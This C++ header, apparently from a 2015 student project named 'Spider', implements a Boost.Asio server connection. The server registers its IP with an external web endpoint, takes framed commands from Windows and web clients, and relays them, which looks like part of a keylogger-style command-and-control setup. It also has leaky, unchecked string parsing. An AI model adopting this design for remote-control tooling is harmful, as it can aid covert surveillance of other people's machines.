//
// Connection.hpp for  in /home/jobertomeu/Work/Spider/server
//
// Made by Joris Bertomeu
// Login   <jobertomeu@epitech.net>
//
// Started on  Wed Oct 21 02:29:24 2015 Joris Bertomeu
// Last update Sat Nov  7 18:47:13 2015 Joris Bertomeu
//

#ifndef		_CONNECTION_HPP_
# define	_CONNECTION_HPP_

#include <sstream>

#define SSTR( x ) dynamic_cast< std::ostringstream & >(( std::ostringstream() << std::dec << x ) ).str()

# include	<IConnection.hpp>
# include	<string>
# include	<list>
# include	<ICommand.hpp>
# include	<OpenSSL.hpp>
# include	<Client.hpp>
# include	<queue>
# include	<CRC.hpp>
# include	<HttpPost.hpp>

/* BOOST ASIO */

# include	<boost/bind.hpp>
# include	<boost/shared_ptr.hpp>
# include	<boost/enable_shared_from_this.hpp>
# include	<boost/asio.hpp>
# include	<iostream>
# include	<fstream>

class NetworkController;

/* BOOST ASIO */

class		Connection : public boost::enable_shared_from_this<Connection>
{
private:
  std::list<ICommand*>	_commandsList;
  OpenSSL		_openSSL;
  typedef struct	s_trame {
    char		id;
    int			size;
    int			crc;
    char		data[255];
  }			t_trame;
  Client		_client;
  void			(NetworkController::*_fn)(int, void*);
  NetworkController	*_nw;
  std::queue<t_trame*>	_queue;
  int			_clientBDDId;

public:
  typedef	boost::shared_ptr<Connection>	ptr;
  static ptr	create(std::list<ICommand*> &commandsList, boost::asio::io_service &io_service, void (NetworkController::*fn)(int, void*), NetworkController *nw, int id) {
    return (ptr(new Connection(commandsList, io_service, fn, nw, id)));
  };
  boost::asio::ip::tcp::socket&	socket() {
    return this->_socket;
  }
  void		write(const std::string &trame) {
    boost::asio::async_write(this->_socket,
			     boost::asio::buffer(trame),
			     boost::bind(&Connection::handleWrite, shared_from_this(),
					 boost::asio::placeholders::error,
					 boost::asio::placeholders::bytes_transferred));
  }
  void		start() {
    std::ifstream	fd;
    char	out[16];

    bzero(out, 16);
    HttpPost::request(".toto",
		      std::string("http://jobertomeu.fr/spider/servlets/putClient?server=0&ip_addr=" +
				  this->_socket.local_endpoint().address().to_string()));
    fd.open(".toto");
    if (!fd.is_open())
      printf("Not openned\n");
    fd >> out;
    printf("-------> %s\n", out);
    this->_clientBDDId = atoi(out);
    printf("ID Set -> %d -> %s\n", this->_clientBDDId, out);
    this->write(this->_handshake);
  }
  int		getId() const {
    return (this->_client.getId());
  }
  void		addToQueue(void *cmd) {
    t_trame	*trame = (t_trame*) cmd;

    this->_queue.push(trame);
    printf("Adding command to queue >%s<\n", trame->data);
  }

private:
  explicit	Connection(std::list <ICommand*> &commandsList, boost::asio::io_service &io_service, void (NetworkController::*fn)(int, void*), NetworkController *nw, int id) : _socket(io_service) {
    this->_client.setMe(this);
    this->_client.setId(id);
    this->_commandsList = commandsList;
    this->_handshake = "Spider_server_v1.1\r\n";
    this->_fn = fn;
    this->_nw = nw;
  }
  void		handleWrite(const boost::system::error_code &e, size_t bytes_transferred) {
    (void) bytes_transferred;
    if (!e)
      this->listenClient();
    else
      this->close();
  }
  int     count_word(char *str)
  {
    int   i;
    int   n;

    i = 0;
    n = 1;
    while (str[i] != '\0' && str[i] != '\n')
      {
	if (str[i] == ',' && str[i + 1] != '\0')
	  n++;
	i++;
      }
    return (n);
  }

  int     countchar(char *str)
  {
    int   c;

    c = 0;
    while ((str[c] != ',') && (str[c] != '\0') && (str[c] != '\n'))
      c++;
    c += 1;
    return (c);
  }

  char    **my_str_to_wordtab(char *str)
  {
    char  **tab;
    int   i;
    int   b;
    int   a;

    b = 0;
    i = 0;
    a = 0;
    tab = (char**) malloc(sizeof(*tab) * ((count_word(str) + 1)));
    while (str[i] != '\n' && str[i] != '\0')
      {
	if (str[i] == ',' || str[i] == '\n')
	  {
	    while (str[i] == ',')
	      i++;
	    a = a + 1;
	    b = 0;
	  }
	tab[a] = (char*) malloc(sizeof(**tab) * ((countchar(str + i) + 1)));
	while ((str[i] != ',')  && (str[i] != '\n') && (str[i] != '\0'))
	  tab[a][b++] = str[i++];
	tab[a][b] = '\0';
      }
    tab[a + 1] = 0;
    return (tab);
  }
  void			handleRead(const boost::system::error_code &e, size_t bytes_transferred) {
    if (e) {
      std::cout << "Error !!!!!!" << std::endl;
      return;
    }
    t_trame		*trame = (t_trame*) malloc(sizeof(*trame));

    bzero(trame, sizeof(*trame));
    if (bytes_transferred != sizeof(t_trame)) {
      std::cout << "Invalid trame " << bytes_transferred << "/" << sizeof(t_trame) << " bytes" << std::endl;
      this->_buff.consume(this->_buff.size());
      this->write("ko\r\n");
      return;
    }
    memcpy(trame, boost::asio::buffer_cast<const void *>(this->_buff.data()), sizeof(t_trame));
    this->_buff.consume(this->_buff.size());
    if (!CRC::verifyCRC(trame->crc, trame->data))
      {
    	std::cerr << "Bad CRC" << std::endl;
      }
    //printf("Recu serverSide >%s<\n", trame->data);
    if (this->_client.getType() == Client::UNDEF) { //Pas encore Set
      if (!strncmp(trame->data, "WIN", 3))
	this->_client.setType(Client::WIN);
      else if (!strncmp(trame->data, "WEB", 3))
	this->_client.setType(Client::WEB);
      std::cout << "New client initialized : " << this->_client.getType() << std::endl;
    } else {
      if (this->_client.getType() == Client::WIN) //Client Windows
	this->execCommand(this->_socket.remote_endpoint().address().to_string(), trame);
      else if (this->_client.getType() == Client::WEB) //Client Web
	(this->_nw->*_fn)(atoi(my_str_to_wordtab(trame->data)[0]), trame); //Get ID Destination
      this->executePendingCommands();
    }
    this->write("ok\r\n");
  }
  void		executePendingCommands() {
    while (!this->_queue.empty())
      {
	this->sendCommand(this->_queue.front());
	this->_queue.pop();
      }
  }
  void		sendCommand(t_trame *trame) {
    printf("Sending command with dta : >%s<\n", my_str_to_wordtab(trame->data)[1]);
  }
  void		listenClient() {
    boost::asio::async_read(this->_socket,
			    this->_buff,
			    boost::asio::transfer_exactly(sizeof(t_trame)),
			    boost::bind(&Connection::handleRead, shared_from_this(),
					boost::asio::placeholders::error,
					boost::asio::placeholders::bytes_transferred));
  }
  void		close() {
    this->_socket.close();
  }
  void		execCommand(const std::string &from, t_trame *trame) {
    bool	find = false;

    (void) from;
    for (std::list<ICommand*>::iterator it = this->_commandsList.begin();
	 it != this->_commandsList.end() && !find; ++it) {
      if ((*it)->getId() == trame->id) {
	std::cout << "Command found with size about " << trame->size << " and checkSum about " << trame->crc << std::endl;
	(*it)->execCommand(this->_socket.local_endpoint().address().to_string(), std::string(SSTR(this->_clientBDDId)), std::string(trame->data));
	find = true;
      }
    }
    std::cout << "Decrypted : " << this->_openSSL.decrypt(this->_openSSL.encrypt(trame->data)) << std::endl;
    if (!find)
      std::cout << "Command not found" << std::endl;
  }

private:
  boost::asio::streambuf	_buff;
  boost::asio::ip::tcp::socket	_socket;
  std::string			_handshake;
};

#endif
